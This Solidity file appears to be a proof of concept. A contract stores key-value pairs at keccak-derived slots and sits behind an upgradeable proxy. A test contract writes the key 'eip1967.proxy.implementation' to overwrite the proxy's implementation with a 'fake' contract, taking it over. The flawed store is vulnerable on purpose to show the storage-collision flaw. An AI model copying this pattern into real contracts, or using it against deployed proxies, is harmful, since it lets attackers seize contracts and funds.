// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import "hardhat/console.sol"; 

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract token is ERC20 {
     constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {     
    }
}

contract transientImplementation  {

   function(string memory) returns (bytes32) immutable load;
   function(string memory, bytes32) immutable store;

   function getSlot(string memory s ) internal pure returns (bytes32) {
      return bytes32(uint256(keccak256(bytes(s)))-1);
   }
   function tstore(string memory s, bytes32 value) internal { 
      bytes32 a = getSlot(s);
      assembly { tstore(a, value)  }       
   }
   function sstore(string memory s, bytes32 value) internal { 
      bytes32 a = getSlot(s);
      assembly { sstore(a, value)  } 
   }

   function tload(string memory s) internal view returns (bytes32 value) { 
      bytes32 a = getSlot(s);
      assembly { value := tload(a) }       
   }
   function sload(string memory s) internal view returns (bytes32 value) { 
      bytes32 a = getSlot(s);
      assembly { value := sload(a) } 
   }

   function tempStoreKeyValue(string memory key, bytes32 value) public {
      store(key,value);
   }
   function tempGetValue(string memory key) public returns (bytes32 value)  {
      return load(key);
   }
   function toString(bytes32 _bytes32) internal pure returns (string memory) {
        uint8 i;
        while (i < 32 && _bytes32[i] != 0) i++;
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && _bytes32[i] != 0; i++) {
            bytesArray[i] = _bytes32[i];
        }
        return string(bytesArray);
   }

   function deployToken() public returns(address){
      string memory name = toString(tempGetValue("name"));
      string memory symbol = toString(tempGetValue("symbol"));
      console.log("Deploying token:",name," / ",symbol);
      token t = new token(name,symbol);
      return address(t);
   }

   constructor(bool _hasTrancient) { // not every chain supports transient storage, fallback via storage
      (load,store) = _hasTrancient ? (tload,tstore) : (sload,sstore);
   }   
}

contract fake {
   function deployToken() public returns(address){
      console.log("The implementation has been taken over");
      return address(0);
   }
}

contract test {  
   transientImplementation _implementation = new transientImplementation(false); // An issue occurs when the fallback option to traditional storage is used.
   transientImplementation public proxy = transientImplementation(address(new TransparentUpgradeableProxy(address(_implementation), address(this), "")));
     
   constructor() {
      proxy.tempStoreKeyValue("name","Token name");
      proxy.tempStoreKeyValue("symbol","Token symbol");
      proxy.deployToken();
 
      proxy.tempStoreKeyValue("eip1967.proxy.implementation",bytes32(uint256(uint160(address(new fake()))))); // this overwrites the implementation
      proxy.deployToken();
      
   }
   
} 


 